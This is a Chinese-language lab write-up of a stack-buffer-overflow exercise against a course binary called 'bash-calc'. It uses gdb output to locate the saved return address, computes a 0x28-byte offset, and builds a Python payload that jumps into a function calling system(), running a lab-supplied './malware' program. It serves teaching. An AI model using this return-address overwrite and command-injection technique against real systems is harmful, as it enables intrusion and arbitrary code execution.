### 关键步

##### 在ret处的断点用 `i frame`:

```asm
Stack level 0, frame at 0x7fffffffdc70:
 rip = 0x401264 in input; saved rip = 0x40134b
 called by frame at 0x7fffffffdc10
 Arglist at 0x7fffffffdc60, args:
 Locals at 0x7fffffffdc60, Previous frame's sp is 0x7fffffffdc70
 Saved registers:
  rbp at 0x7fffffffdc60, rip at 0x7fffffffdc68
```

`saved rip` 是返回后跳转到的地址，这是我们的抓手。

##### 在输入前的一个端点用 `x/40x $rbp`获取栈内存:

```asm
0x7fffffffdc60: 0x00    0xdc    0xff    0xff    0xff    0x7f    0x00    0x00
0x7fffffffdc68: 0x4b    0x13    0x40    0x00    0x00    0x00    0x00    0x00
0x7fffffffdc70: 0x10    0xdd    0xff    0xff    0xff    0x7f    0x00    0x00
0x7fffffffdc78: 0xca    0x01    0xdd    0xf7    0xff    0x7f    0x00    0x00
0x7fffffffdc80: 0xc0    0xdc    0xff    0xff    0xff    0x7f    0x00    0x00
```

发现和上面 `saved rip` 对应的部分 `0x4b    0x13    0x40`

##### 用长字符串溢出尝试覆盖这一部分：

```
Enter an expression (length up to 15):
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 3, 0x0000000000401329 in input ()
(gdb) x/40x $rbp
0x7fffffffdc60: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffffdc68: 0x41    0x41    0x41    0x41    0x41    0x00    0x00    0x00
0x7fffffffdc70: 0x10    0xdd    0xff    0xff    0xff    0x7f    0x00    0x00
0x7fffffffdc78: 0xca    0x01    0xdd    0xf7    0xff    0x7f    0x00    0x00
0x7fffffffdc80: 0xc0    0xdc    0xff    0xff    0xff    0x7f    0x00    0x00
```

成功覆盖，同时也得到前置位数为 *40* 即 *0x28*

##### 找到我们要跳转的地址：

```asm
Dump of assembler code for function eval:
   0x0000000000401216 <+0>:     endbr64
   0x000000000040121a <+4>:     push   %rbp
   0x000000000040121b <+5>:     mov    %rsp,%rbp
   0x000000000040121e <+8>:     sub    $0x10,%rsp
   0x0000000000401222 <+12>:    mov    %rdi,-0x8(%rbp)
   0x0000000000401226 <+16>:    mov    -0x8(%rbp),%rax
   0x000000000040122a <+20>:    mov    %rax,%rsi
   0x000000000040122d <+23>:    lea    0xde0(%rip),%rdi        # 0x402014
   0x0000000000401234 <+30>:    mov    $0x0,%eax
   0x0000000000401239 <+35>:    call   0x4010f0 <printf@plt>
   0x000000000040123e <+40>:    mov    -0x8(%rbp),%rax
   0x0000000000401242 <+44>:    mov    %rax,%rdi
   0x0000000000401245 <+47>:    call   0x4010e0 <system@plt>
   0x000000000040124a <+52>:    mov    0x2e1f(%rip),%rax        # 0x404070 <stdout@@GLIBC_2.2.5>
   0x0000000000401251 <+59>:    mov    %rax,%rdi
   0x0000000000401254 <+62>:    call   0x401110 <fflush@plt>
   0x0000000000401259 <+67>:    nop
   0x000000000040125a <+68>:    leave
   0x000000000040125b <+69>:    ret
End of assembler dump.
```

根据文档，我们要跳过 `push   %rbp`，于是目标为 ` 0x000000000040121b`

##### 创建 `payload`：

```py
import sys
payload = b'A' * 0x28 + b'\x1b\x12\x40\x00\x00\x00\x00\x00'
sys.stdout.buffer.write(payload)
```

这时候输出为：

```bash
lyingloong@Redmi:/mnt/d/Code/Task_Forge/24_11_23/lab3-stacklab-Josephxx-sky/Task1_2$ python3 payload.py | ./bash-calc
Enter an expression (length up to 15):
Executing: AAAAAAAAAAAAAAA))
sh: 1: Syntax error: ")" unexpected
```

##### 改为我们自己的指令：

另外这里我们利用 `#` 来注释掉后面的无用内容

```py
import sys
payload = b'./malware #'+ b'A' * 0x1D + b'\x1b\x12\x40\x00\x00\x00\x00\x00'
sys.stdout.buffer.write(payload)
```

##### 成功

```bash
lyingloong@Redmi:/mnt/d/Code/Task_Forge/24_11_23/lab3-stacklab-Josephxx-sky/Task1_2$ python3 payload.py | ./bash-calc
Enter an expression (length up to 15):
Executing: ./malware #AAAA))

systemd,1
  └─init-systemd(Ub,2
      └─SessionLeader,284
          └─Relay(286),285
              └─bash,286
                  └─bash-calc,1002
                      └─sh,1003 -c -- ./malware #AAAA))
                          └─malware,1004 ./malware
                              └─pstree,1005 -a -l -p -s -H 1004 1004

### The bomb was triggered by the bash-calc process. ###
### You have successfully detonated the bomb! Congratulations! ###
```

